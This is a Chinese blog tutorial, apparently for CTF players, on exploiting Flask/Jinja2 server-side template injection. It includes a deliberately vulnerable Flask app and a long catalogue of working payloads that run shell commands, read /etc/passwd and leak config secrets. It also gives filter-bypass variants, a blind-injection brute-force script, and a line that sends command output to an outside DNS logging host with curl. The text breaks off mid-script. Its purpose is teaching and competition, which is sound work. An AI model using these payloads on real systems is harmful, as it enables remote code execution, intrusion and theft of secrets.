> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif)

亲爱的, 关注我吧

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif)

**12/18**

本文字数 10061

来和我一起阅读吧

前言
--

SSTI（Server-Side Template Injection）服务端模板注入在 CTF 中并不是一个新颖的考点了，之前略微学习过，但是最近的大小比赛比如说安洵杯，祥云杯，太湖杯，南邮 CTF，上海大学生安全竞赛等等比赛都频频出现，而且赛后看到师傅们各种眼花缭乱的 payload，无法知晓其中的原理，促使我写了这篇文章来总结各种 bypass SSTI 的方法。

**本文涉及知识点实操练习 -Flask 服务端模板注入漏洞**

**复制下方链接或者点击阅读原文操作哦**

https://www.hetianlab.com/expc.do?w=exp_ass&ec=ECID87ed-2223-40e5-8083-f5c55d69af28&pk_campaign=weixin-wemedia

基础知识
----

本篇文章从 Flask 的模板引擎 Jinja2 入手，CTF 中大多数也都是使用这种模板引擎

### 模板的基本语法

官方文档对于模板的语法介绍如下

```
https://p0sec.net/index.php/archives/120/
https://www.jianshu.com/p/a736e39c3510
https://www.redmango.top/article/43
https://xz.aliyun.com/t/8029
https://xz.aliyun.com/t/7746
```

这里我们逐条来看

*   `{%%}`
    

主要用来声明变量，也可以用于条件语句和循环语句。

```
{% set c= 'kawhi' %}
{% if 81==9*9 %}kawhi{% endif %}
{% for i in ['1','2','3'] %}kawhi{%endfor%}
```

*   `{{}}`
    

用于将表达式打印到模板输出，比如我们一般在里面输入`2-1`，`2*2`，或者是字符串，调用对象的方法，都会渲染出结果

```
{{2-1}} #输出1
{{2*2}} #输出4
```

我们通常会用`{{2*2}}`简单测试页面是否存在 SSTI

*   `{##}`
    

表示未包含在模板输出中的注释

*   `##`
    

有和`{%%}`相同的效果

这里的模板注入主要用到的是`{{}}`和`{%%}`

### 常见的魔术方法

*   `__class__`
    

用于返回对象所属的类

```
Python 3.7.8
>>> ''.__class__
<class 'str'>
>>> ().__class__
<class 'tuple'>
>>> [].__class__
<class 'list'>
```

*   `__base__`
    

以字符串的形式返回一个类所继承的类

*   `__bases__`
    

以元组的形式返回一个类所继承的类

*   `__mro__`
    

返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类

```
Python 3.7.8
>>> class Father():
...     def __init__(self):
...             pass
...
>>> class GrandFather():
...     def __init__(self):
...             pass
...
>>> class son(Father,GrandFather):
...     pass
...
>>> print(son.__base__)
<class '__main__.Father'>
>>> print(son.__bases__)
(<class '__main__.Father'>, <class '__main__.GrandFather'>)
>>> print(son.__mro__)
(<class '__main__.son'>, <class '__main__.Father'>, <class '__main__.GrandFather'>, <class 'object'>)
```

*   `__subclasses__()`
    

获取类的所有子类

*   `__init__`
    

所有自带带类都包含`init`方法，常用他当跳板来调用`globals`

*   `__globals__`
    

会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合`init`使用

### 漏洞成因与防御

存在模板注入漏洞原因有二，一是存在用户输入变量可控，二是了使用不固定的模板，这里简单给出一个存在 SSTI 的代码如下

`ssti.py`

```
from flask import Flask,request,render_template_string
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

我们简单输入一个`{{2-1}}`，返回了 1，说明存在模板注入

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHVgE4aiawmiaNu6tVtjYsNSWdbXLjjRC99tucY4P5Jp76tab6k3HB2oFQ/640?wx_fmt=png)

而如果存在 SSTI 的话，我们就可以利用上面的魔术方法去构造可以读文件或者直接 getshell 的漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHSZ7RKESpCx3P8HIhfxEmTUiaTEk3siaR80IR2GzL4mJjPopYkTnt4z9w/640?wx_fmt=png)

如何拒绝这种漏洞呢，其实很简单只需要使用固定的模板即可，正确的代码应该如下

`ssti2.py`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHsiatq9Xn245MM2vAxIzEJFRvruLibo4F0LGaO2pELZZLa9aInibJibicSFA/640?wx_fmt=png)

`index.html`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHqeCWAPS5ibU4YSfqPhzMGVANXJIVuo0Kp7aLq6OQnHOb5CwqWRkeLIg/640?wx_fmt=png)

可以看到原封不动的输出了`{{2-1}}`  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHBKhKHA65JdAibPMu4e1iazVshcHEc7oPpa8ZVjW9GibNnDAENibHbThFicg/640?wx_fmt=png)

  

构造链思路
-----

这里从零开始介绍如何去构造 SSTI 漏洞的 payload，可以用上面存在 SSTI 漏洞的`ssti.py`做实验

*   第一步
    

目的：使用`__class__`来获取内置类所对应的类

可以通过使用`str`，`list`，`tuple`，`dict`等来获取

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHyR7GaSBAhy1mahVWaicTSljtPvrTK2IAMSib6Be8APz9v1kUhWkduibRQ/640?wx_fmt=png)

*   第二步
    

目的：拿到`object`基类

用`__bases__[0]`拿到基类

```
Python 3.7.8
>>> ''.__class__.__bases__[0]
<class 'object'>
```

用`__base__`拿到基类

```
Python 3.7.8
>>> ''.__class__.__base__
<class 'object'>
```

用`__mro__[1]`或者`__mro__[-1]`拿到基类

```
Python 3.7.8
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[-1]
<class 'object'>
```

*   第三步
    

用`__subclasses__()`拿到子类列表

```
Python 3.7.8
>>> ''.__class__.__bases__[0].__subclasses__()
...一大堆的子类
```

*   第四步
    

在子类列表中找到可以 getshell 的类

寻找利用类
-----

在上述的第四步中，如何快速的寻找利用类呢

### 利用脚本跑索引

我们一般来说是先知晓一些可以 getshell 的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以 getshell 的类

这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以`popen`为例子

`find.py`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuH0x9ZrJwp4J2yHBiaFr0fqISeuRvMkwHgRc0euwtwTo9r4BicuHPO22cw/640?wx_fmt=png)

我们运行这个脚本

```
λ python3 find.py
<class 'os._wrap_close'> 128
```

可以发现`object`基类的第 128 个子类名为`os._wrap_close`的这个类有 popen 方法

先调用它的`__init__`方法进行初始化类

```
Python 3.7.8
>>> "".__class__.__bases__[0].__subclasses__()[128].__init__
<function _wrap_close.__init__ at 0x000001FCD0B21E58>
```

再调用`__globals__`可以获取到方法内以字典的形式返回的方法、属性等值

```
Python 3.7.8
>>> "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__
{'__name__': 'os'...中间省略...<class 'os.PathLike'>}
```

然后就可以调用其中的 popen 来执行命令

```
Python 3.7.8
>>> "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
'desktop-t6u2ptl\\think\n'
```

但是上面的方法仅限于在本地寻找，因为在做 CTF 题目的时候，我们无法在题目环境中运行这个`find.py`，这里用 hhhm 师傅的一个脚本直接去寻找子类

我们首先把所有的子类列举出来

```
Python 3.7.8
>>> ().__class__.__bases__[0].__subclasses__()
...一大堆的子类
```

然后把子类列表放进下面脚本中的 a 中，然后寻找`os._wrap_close`这个类

`find2.py`

```
import json

a = """
<class 'type'>,...,<class 'subprocess.Popen'>
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k)+"--->"+v)
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHTYZ0T3v6aK0cVFnGBmGeKGofd94juXEZR9ygLOKsYU3Z9F7jLVWIicw/640?wx_fmt=png)

  

又或者用如下的`requests`脚本去跑

`find3.py`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHa2IiaNAvFWOiaAQwjG4PHcpzIwK7SmydWQdXvQnbxKAgzsoibLYQvKrag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHWGial2tsIgMxPHiaWRAwOJXoOB0HxNxlkAERhNjQgZt8rxXO7zRhjaNA/640?wx_fmt=png)

tips：后面的各种方法都是利用这种思路寻找到可以 getshell 类的位置

### python3 的方法

*   `os._wrap_close`类中的`popen`
    

在上面的例子中就是用的这个方法，payload 如下

```
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
```

*   `__import__`中的`os`
    

把上面`find.py`脚本中的 search 变量换成`__import__`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHzLzmshVlYxs02DobDVpdDwEJ5kwOseiccibHZmTuSkfWX7xBdlPRFSOw/640?wx_fmt=png)

可以看到有 5 个类下是包含`__import__`的，随便用一个即可

payload 如下

```
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
```

### python2 的方法

因为 python3 和 python2 两个版本下有差别，这里把 python2 单独拿出来说

tips：python2 的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuH34a4EwZh6h2U0ymL3L3nTVA9oFjwY39SxMOpUBzZWRqfTPQpR978uA/640?wx_fmt=png)

*   `file`类读写文件
    

本方法只能适用于 python2，因为在 python3 中`file`类已经被移除了

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHSrByGicWvibeOmKAO1J80SWVz54icjLV8VT4wqEfN310r1x17L89yibSSg/640?wx_fmt=png)

可以使用 dir 查看 file 对象中的内置方法

```
>>> dir(().__class__.__bases__[0].__subclasses__()[40])
['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
```

然后直接调用里面的方法即可，payload 如下

读文件

```
{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}

{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
```

*   `warnings`类中的`linecache`
    

本方法只能用于 python2，因为在 python3 中会报错`'function object' has no attribute 'func_globals'`，猜测应该是 python3 中`func_globals`被移除了还是啥的，如果不对请师傅们指出

我们把上面的`find.py`脚本中的 search 变量赋值为`linecache`，去寻找含有`linecache`的类

```
λ python find.py
(<class 'warnings.WarningMessage'>, 59)
(<class 'warnings.catch_warnings'>, 60)
```

后面如法炮制，payload 如下

```
{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}
```

### python2&3 的方法

这里介绍 python2 和 python3 两个版本通用的方法

*   `__builtins__`代码执行
    

这种方法是比较常用的，因为他两种 python 版本都适用

首先`__builtins__`是一个包含了大量内置函数的一个模块，我们平时用 python 的时候之所以可以直接使用一些函数比如`abs`，`max`，就是因为`__builtins__`这类模块在 Python 启动时为我们导入了，可以使用`dir(__builtins__)`来查看调用方法的列表，然后可以发现`__builtins__`下有`eval`，`__import__`等的函数，因此可以利用此来执行命令。

把上面`find.py`脚本 search 变量赋值为`__builtins__`，然后找到第 140 个类`warnings.catch_warnings`含有他，而且这里的话比较多的类都含有`__builtins__`，比如常用的还有`email.header._ValueFormatter`等等，这也可能是为什么这种方法比较多人用的原因之一吧

再调用`eval`等函数和方法即可，payload 如下

```
{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

又或者用如下两种方式，用模板来跑循环

```
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHeSPLLmNqC3HGQR15vCCCGVCNXP3gsGWwrreHWF7hDvgvpV1ee2Xncw/640?wx_fmt=png)

  

读取文件 payload

```
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

然后这里再提一个比较少人提到的点

`warnings.catch_warnings`类在在内部定义了`_module=sys.modules['warnings']`，然后`warnings`模块包含有`__builtins__`，也就是说如果可以找到`warnings.catch_warnings`类，则可以不使用`globals`，payload 如下

```
{{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
```

总而言之，原理都是先找到含有`__builtins__`的类，然后再进一步利用

*   `subprocess.Popen`进行 RCE
    

我们可以用`find2.py`寻找`subprocess.Popen`这个类，可以直接 RCE，payload 如下

```
{{''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
```

*   直接利用`os`
    

一开始我以为这种方法只能用于 python2，因为我在本地实验的时候 python3 中无法找到直接含有 os 的类，但后来发现 python3 其实也是能够用的，主要是环境里面有这个那个类才行

我们把上面的`find.py`脚本中的 search 变量赋值为 os，去寻找含有 os 的类

```
λ python find.py
(<class 'site._Printer'>, 69)
(<class 'site.Quitter'>, 74)
```

后面如法炮制，payload 如下

```
{{().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()}}
```

### 获取配置信息

我们有时候可以使用 flask 的内置函数比如说`url_for`，`get_flashed_messages`，甚至是内置的对象`request`来查询配置信息或者是构造 payload

*   `config`
    

我们通常会用`{{config}}`查询配置信息，如果题目有设置类似`app.config ['FLAG'] = os.environ.pop('FLAG')`，就可以直接访问`{{config['FLAG']}}`或者`{{config.FLAG}}`获得 flag

*   `request`
    

jinja2 中存在对象`request`

```
Python 3.7.8
>>> from flask import Flask,request,render_template_string
>>> request.__class__.__mro__[1]
<class 'object'>
```

查询一些配置信息

```
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
```

构造 ssti 的 payload

```
{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
```

*   `url_for`
    

查询配置信息

```
{{url_for.__globals__['current_app'].config}}
```

构造 ssti 的 payload

```
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
```

*   `get_flashed_messages`
    

查询配置信息

```
{{get_flashed_messages.__globals__['current_app'].config}}
```

构造 ssti 的 payload

```
{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
```

绕过黑名单
-----

CTF 中一般考的就是怎么绕过 SSTI，我们学会如何去构造 payload 之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload 中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下

### 过滤了点

过滤了`.`

在 python 中，可用以下表示法可用于访问对象的属性

```
{{().__class__}}
{{()["__class__"]}}
{{()|attr("__class__")}}
{{getattr('',"__class__")}}
```

也就是说我们可以通过`[]`，`attr()`，`getattr()`来绕过点

*   使用`[]`绕过
    

使用访问字典的方式来访问函数或者类等，下面两行是等价的

```
{{().__class__}}
{{()['__class__']}}
```

以此，我们可以构造 payload 如下

```
{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}
```

*   使用`attr()`绕过
    

使用原生 JinJa2 的函数`attr()`，以下两行是等价的

```
{{().__class__}}
{{()|attr('__class__')}}
```

以此，我们可以构造 payload 如下

```
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```

*   使用`getattr()`绕过
    

这种方法有时候由于环境问题不一定可行，会报错`'getattr' is undefined`，所以优先使用以上两种

```
Python 3.7.8
>>> ().__class__
<class 'tuple'>
>>> getattr((),"__class__")
<class 'tuple'>
```

### 过滤引号

过滤了`'`和`"`

*   `request`绕过
    

flask 中存在着`request`内置对象可以得到请求的信息，`request`可以用 5 种不同的方式来请求信息，我们可以利用他来传递参数绕过

```
request.args.name
request.cookies.name
request.headers.name
request.values.name
request.form.name
```

payload 如下

`GET`方式，利用`request.args`传递参数

```
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd
```

`POST`方式，利用`request.values`传递参数

```
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
post:arg1=open&arg2=/etc/passwd
```

`Cookie`方式，利用`request.cookies`传递参数

```
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd
```

剩下两种方法也差不多，这里就不赘述了

*   chr 绕过
    

```
{{().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}
```

这里先爆破`subclasses`，获取`subclasses`中含有 chr 的类索引

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHCG3eJXltI5diaHXibOCtZeEMM1avic0W9Uq4RUOZKh7QKqjhibuMKjUSSQ/640?wx_fmt=png)

然后就可以用 chr 来绕过传参时所需要的引号，然后需要用 chr 来构造需要的字符

这里我写了个脚本可以快速构造想要的 ascii 字符

```
<?php
$a = 'whoami';
$result = '';
for($i=0;$i<strlen($a);$i++)
{
 $result .= 'chr('.ord($a[$i]).')%2b';
}
echo substr($result,0,-3);
?>
//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)
```

最后 payload 如下

```
{% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
```

### 过滤下划线

过滤了`_`

*   编码绕过
    

使用十六进制编码绕过，`_`编码后为`\x5f`，`.`编码后为`\x2E`

payload 如下

```
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()}}
```

这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个 python 脚本方便转换

```
string1="__class__"
string2="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
def tohex(string):
  result = ""
  for i in range(len(string)):
      result=result+"\\x"+hex(ord(string[i]))[2:]
  print(result)

tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
print(string2) #__class__
```

随便构造个 payload 如下

```
{{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()}}
```

*   `request`绕过
    

在上面的过滤引号已经介绍过了，这里不再赘述

### 过滤关键字

首先要看关键字是如何被过滤的

如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过

如果直接 ban 了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下

*   拼接字符绕过
    

这里以过滤 class 为例子，用中括号括起来然后里面用引号连接，可以用`+`号或者不用

```
{{()['__cla'+'ss__'].__bases__[0]}}
{{()['__cla''ss__'].__bases__[0]}}
```

随便写个 payload 如下

```
{{()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")}}
```

或者可以使用 join 来进行拼接

```
{{()|attr(["_"*2,"cla","ss","_"*2]|join)}}
```

看到有师傅甚至用管道符加上`format`方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的`%s`被`l`替换

```
{{()|attr(request.args.f|format(request.args.a))}}&f=__c%sass__&a=l
```

*   使用使用`str`原生函数
    

`replace`绕过，payload 如下

```
{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
```

`decode`绕过，但这种方法经过测试只能在 python2 下使用，payload 如下

```
{{().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

*   替代的方法
    

过滤 init，可以用`__enter__`或`__exit__`替代

```
{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

过滤 config，我们通常会用`{{config}}`获取当前设置，如果被过滤了可以使用以下的 payload 绕过

```
{{self}} ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context}}
```

### 过滤中括号

过滤了`[`和`]`

*   数字中的中括号
    

在 python 里面可以使用以下方法访问数组元素

```
Python 3.7.8
>>> ["a","kawhi","c"][1]
'kawhi'
>>> ["a","kawhi","c"].pop(1)
'kawhi'
>>> ["a","kawhi","c"].__getitem__(1)
'kawhi'
```

也就是说可以使用`__getitem__`和`pop`替代中括号，取列表的第 n 位

payload 如下

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()}

{{().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()}}
```

*   魔术方法的中括号
    

调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了 class 和中括号

可用`__getattribute__`绕过

```
{{"".__getattribute__("__cla"+"ss__").__base__}}
```

或者可以配合`request`一起使用

```
{{().__getattribute__(request.args.arg1).__base__}}&arg1=__class__
```

payload 如下

```
{{().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()}}&arg1=__class__&arg2=whoami
```

这种同样是绕过关键字的方法之一

### 过滤双大括号

过滤了`{{`和`}}`

*   使用 dns 外带数据
    

用`{%%}`替代了`{{}}`，使用判断语句进行 dns 外带数据

```
{% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %}1{% endif %}
```

然后在 ceye 平台接收数据即可

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHmd6B7kEQplegOr5UPgBdb3VOe5NXSicw0LFPibibHYcN5NctKn7q4I3ag/640?wx_fmt=png)

*   盲注
    

如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上 p0 师傅的脚本

```
# -*- coding: utf-8 -*-
import requests

url = 'http://ip:5000/?name='

def check(payload):
    r = requests.get(url+payload).content
    return 'kawhi' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '{% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}kawhi{% endif %}'
        if check(payload):
            password += c
            break
    print password
```

*   `print`标记
    

我们上面之所以要 dnslog 外带数据以及使用盲注，是因为用`{%%}`会没有回显，这里的话可以使用`print`来做一个标记使得他有回显，比如`{%print config%}`，payload 如下

```
{%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%}
```

payload 进阶与拓展
-------------

这里我基于上面绕过黑名单各种方法的组合，对 CTF 中用到的一些方法和 payload 再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展

### 过滤`_`和`.`和`'`

这里顺便给一个不常见的方法，主要是找到`_frozen_importlib_external.FileLoader`的`get_data()`方法，第一个是参数 0，第二个为要读取的文件名，payload 如下

```
{{().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")}}
```

使用十六进制绕过后，payload 如下

```
{{()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")}}
```

### 过滤`args`和`.`和`_`

之前某二月赛在 y1ng 师傅博客看到的一个 payload，原理并不难，这里使用了`attr()`绕过点，`values`绕过`args`，payload 如下

```
{{()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])}}

post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()
```

### 导入主函数读取变量

有一些题目我们不并需要去 getshell，比如 flag 直接暴露在变量里面了，像如下这样把`/flag`文件加载到 flag 这个变量里面了

```
f = open('/flag','r')
flag = f.read()
```

我们就可以通过`import`是导入`__main__`主函数去读变量，payload 如下

```
{%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %}
```

### Unicode 绕过

这种方法是从安洵杯 2020 官方 Writeup 学到的，我们直奔主题看 payload

```
{%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%}
```

这里的`print`绕过`{{}}`和`attr`绕过`.`上面已经说过了这里不赘述

然后这里的`lipsum`用`{{lipsum}}`测了一下发现是个方法

```
<function generate_lorem_ipsum at 0x7fcddfa296a8>
```

然后用他直接调用`__globals__`发现可以直接执行 os 命令，测了一下发现`__builtins__`也可以用，又学到了一种新方法，只能说师傅们 tql

```
{{lipsum.__globals__['os'].popen('whoami').read()}}
{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
```

回到正题，这里使用了 Unicode 编码绕过关键字，下面两行是等价的

```
{{()|attr("__class__")}}
{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")}}
```

知道了这两点之后，那个官方给的 payload 就很明朗了，解开编码后如下

```
{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%}
```

然后我这里顺便给个 Unicode 互转的 php 脚本

```
<?php
//字符串转Unicode编码
function unicode_encode($strLong) {
  $strArr = preg_split('/(?<!^)(?!$)/u', $strLong);//拆分字符串为数组(含中文字符)
  $resUnicode = '';
  foreach ($strArr as $str)
  {
      $bin_str = '';
